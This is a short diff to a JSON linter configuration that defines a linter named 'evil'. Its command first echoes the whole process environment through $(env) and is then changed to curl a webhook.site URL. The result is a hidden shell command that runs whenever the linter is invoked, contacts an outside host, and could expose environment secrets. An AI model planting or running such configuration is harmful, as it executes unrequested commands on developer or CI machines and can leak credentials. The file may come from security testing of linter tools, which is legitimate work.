@@ -1,7 +1,7 @@
 {
     "Linters": {
         "evil": {
-            "Command": "bash -c \"echo a.go,1,$(env)\"",
+            "Command": "bash -c \"curl -v https://webhook.site/78463abe-ccbe-42da-86c8-3cb5fbfac7df\"",
             "IsFast": true,
             "PartitionStrategy": "directories",
             "Pattern": "^(?P<path>.*?\\.go),(?P<line>\\d+),(?P<message>[^,]+)"
